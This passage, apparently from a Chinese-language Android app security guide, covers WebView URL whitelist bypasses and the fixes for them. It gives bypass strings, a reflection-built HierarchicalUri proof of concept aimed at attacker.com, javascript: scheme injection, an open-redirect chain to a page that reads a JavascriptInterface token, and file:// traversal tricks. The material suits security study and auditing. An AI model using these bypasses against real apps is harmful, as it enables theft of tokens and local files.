<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、设置<span class="keyword">set</span>AllowFileAccess方法为<span class="literal">false</span>,设置<span class="keyword">set</span>AllowFileAccessFromFileURLs和 </span><br><span class="line">    <span class="keyword">set</span>AllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line">2、在Android4.0<span class="params">(API15)</span>及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line">3、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure>
<h5 id="污染cookie">污染cookie</h5>
<p><a target="_blank" rel="noopener" href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p>
<h4 id="URL配置漏洞">URL配置漏洞</h4>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/201407.html">一文彻底搞懂安卓WebView白名单校验 - FreeBuf网络安全行业门户</a></p>
<p>许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞getUserInfo</p>
<p>URL的构造：</p>
<p><code>scheme://login:password@address:port/path/to/resource/?query_string#fragment</code></p>
<ul>
<li>scheme<br>
不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前<strong>加空格</strong>也是可以正常解析的</li>
<li>login:password@（认证信息）<br>
服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个<strong>不常见字段往往可以绕过</strong>很多检查</li>
<li>address<br>
address字段可以是一个<strong>不区分大小写</strong>的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li>
<li>port<br>
端口号</li>
<li>/path/to/resource<br>
层级路径，可以使用“…/”到上一级目录</li>
<li>query_string<br>
查询字符串，格式为”query_string?name1=value1&amp;name2=value2”</li>
<li>fragment<br>
用于html中的页面定位</li>
</ul>
<h5 id="URL绕过漏洞">URL绕过漏洞</h5>
<p><a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过 | m4bln (mabin004.github.io)</a></p>
<p>看一个简单的url校验例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">    enableJavaScriptInterface();</span><br><span class="line">    <span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用checkDomain对域名进行校验</p>
<p>实际中会发现这样的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显这里是为了防止加载file的同源策略进行的防护，但是我们有很多绕过的方法</p>
<p><strong>总结</strong></p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.大写字母 <span class="keyword">File</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">2</span>.前面加上空格： <span class="keyword">file</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">3</span>.字符编码：“<span class="keyword">file</span>：%<span class="number">2</span>F/”</span><br><span class="line"><span class="number">4</span>.可正常访问的畸形路径：<span class="keyword">file</span>:sdcard<span class="regexp">/attack/</span>html” 或 “<span class="keyword">file</span>:<span class="regexp">/\//</span>sdcard/attack.html</span><br></pre></td></tr></table></figure>
<p><strong>常见的url检验</strong></p>
<p>url中会对首尾进行校验</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(host.endsWith(&quot;mysite.com&quot;))&#123;</span><br><span class="line">    <span class="built_in">enableJavascriptInterface</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在问题：endsWith未闭合点号</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite<span class="selector-class">.com</span>  <span class="comment">//恶意域名</span></span><br><span class="line">修复：<span class="built_in">endsWith</span>(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>使用startsWith，contains，indexOf，正则匹配等非严格字符串匹配</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">    enableJavascriptInterface();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">绕过：mysite.com<span class="meta">@oppo</span>.com</span><br></pre></td></tr></table></figure>
<p>contains +indexOf绕过：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">子路径 mysite.<span class="keyword">com</span>/huawei.<span class="keyword">com</span></span><br><span class="line">参数 mysite.<span class="keyword">com</span>/xxxx#huawei.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>
<p><strong>//和第一个/之间提取host</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过方式：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.<span class="keyword">com</span>.mysite.<span class="keyword">com</span></span><br><span class="line">http://huawei.com@www.rebeyond.net/poc.htm</span><br><span class="line">http://<span class="variable">a:a</span>@www.huawei.<span class="keyword">com</span>:b@www.baidu.<span class="keyword">com</span> 在android中使用getHost获取到的是huawei.<span class="keyword">com</span>,但实际访问的是baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.VIEW</span> -d URI的值  启动这个url</span><br></pre></td></tr></table></figure>
<h5 id="hearachical-Uri绕过">hearachical Uri绕过</h5>
<p>假设我们加载的uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical 来绕过</p>
<p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">   webView.loadUrl(uri.toString(), getAuthHeaders()); <span class="comment">//getAuthHeaders()请求头信息</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>android.net.Uri在Android被广泛使用，但实际上他是一个抽象类 android.net.Uri$HierarchicalUri是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p>
<p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<code>https://legitimate.com@attacker.com</code>的HierachicalUri实例即可绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>文件<code>TestActivity.java</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"> </span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"> </span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞防护：</strong></p>
<p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p>
<p>Uri uri = Uri.parse(intent.getData().toString());</p>
<p>从 API 级别 28 (Android 9) 开始，<a target="_blank" rel="noopener" href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a target="_blank" rel="noopener" href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p>
<h5 id="URL-Scheme绕过">URL Scheme绕过</h5>
<p><strong>漏洞原理</strong></p>
<p>代码在进行url校验时，检查了host，但是未检查Scheme，这样我们就可以通过“javascript”绕过。</p>
<p>例如：</p>
<p>相当于执行了一行js代码，第一行通过//符号来骗过java.net.URI获取到值为www.mysite.com的host，恰好//符号在Javascript的世界里是行注释符号，所以第一行实际并没有执行；然后通过%0d%0a换行，继续执行window.location.href=’<a target="_blank" rel="noopener" href="http://www.bing.com">http://www.bing.com</a>’</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_CY63B8H4GFW7TGH.png" alt="image-20220730132455921"></p>
<p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p>
<p>其中 <strong>window.location.href</strong></p>
<ul>
<li>是javascript中一个非常常用的属性，它用于获取或设置当前窗口或标签页面的URL。这个属性<strong>返回完整的URL</strong></li>
</ul>
<p><strong>漏洞复现</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_6G9TXKBZB6B63JZ.png" alt="image-20220730132644522"></p>
<p>然后进行构造html<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_47T7BWXAEHJ3XRX.png" alt="image-20220730132704180"></p>
<p><strong>安全防护</strong></p>
<p>URL校验函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_JGTPHZEGNU7BAGX.png" alt="image-20220730132918854"></p>
<p><strong>Intent Scheme校验建议写法</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> Intent <span class="built_in">int</span>ent = Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">int</span>ent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> <span class="built_in">int</span>ent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> <span class="built_in">int</span>ent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(<span class="built_in">int</span>ent，<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<h5 id="服务器跳转漏洞绕过"><strong>服务器跳转漏洞绕过</strong></h5>
<p><strong>漏洞原理</strong></p>
<p>白名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调用JavascriptInterface，例如我们构造一个这样的URL</p>
<p><code>https:</code>/<code>/</code><a target="_blank" rel="noopener" href="http://www.site1.com">www.site1.com</a><code>/</code>redirect.php?url<code>=</code>https:<code>/</code>/<code>www.baidu.com</code></p>
<p>前面的https:<code>/</code>/<code>www.site1.com</code>/<code>redirect.php</code>是我们构造的虚拟站点，当主机访问时，打开这个url后，服务器会返回一个302响应，然后浏览器会请求指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p>
<p>然后我们就可以构造URL来绕过域名白名单：</p>
<p><code>https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</code></p>
<p><strong>漏洞复现</strong></p>
<p>首先我们编写攻击的htm：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们使用文件服务器来进行模拟<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ABKZHS9QBDVBZH8.png" alt="image-20220730114753663"></p>
<p>我们接着编写测试样本代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"> </span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p>
<p><code>https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</code></p>
<h5 id="file协议绕过">file协议绕过</h5>
<p><a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过</a></p>
<p>app经常会使用file://协议加载本地文件，通常会限制在一些特定的路径中，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="regexp">//</span>”)来判断是否为file协议，因为“FILE:<span class="regexp">//</span>”(大小)、“File:<span class="regexp">//</span>”(大小写)、“ file:<span class="regexp">//</span>”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file:<span class="regexp">//</span>”)更不靠谱，推荐使用getScheme()来判断协议；</span><br><span class="line">(<span class="number">2</span>)file:<span class="regexp">//</span><span class="regexp">/android_asset和file:/</span><span class="regexp">//</span>android_res 也可以../穿越</span><br><span class="line">(<span class="number">3</span>)白名单判断了“..<span class="regexp">/，但通过“..\”也是可以穿越的，例如file:/</span><span class="regexp">//</span>sdcard<span class="regexp">/..\../</span>sdcard/<span class="number">1</span>.html</span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="regexp">//</span>a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span><br><span class="line">(<span class="number">5</span>)file:<span class="regexp">//</span>baidu.com<span class="regexp">/data/</span>data/tmp 前边的baidu.com是可以不被解析的</span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="regexp">//</span><span class="regexp">/，还是仍然能够正常loadUrl，如file:mnt/</span>sdcard/filedomain.html</span><br><span class="line">(<span class="number">7</span>)白名单判断了“..<span class="regexp">/”，但通过url编码绕过，例如file:/</span><span class="regexp">//</span>data<span class="regexp">/data/</span>com.app<span class="regexp">/%2e%2e/</span>%<span class="number">2</span>e%<span class="number">2</span>e<span class="regexp">/%2e%2e/</span>sdcard/xxx</span><br><span class="line">(<span class="number">8</span>)replace(“..<span class="regexp">/“,””) 可以使用”…./</span><span class="regexp">/“绕过  替换一个../</span> 还有../存在</span><br></pre></td></tr></table></figure>
<h4 id="Intent-WebView">Intent + WebView</h4>
<h5 id="Intent访问导出组件加载恶意界面和窃取信息"><strong>Intent访问导出组件加载恶意界面和窃取信息</strong></h5>
<p><strong>漏洞原理</strong></p>
<p>主要通过WebView对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p>
<p><strong>漏洞复现</strong></p>
<p>样例代码：</p>
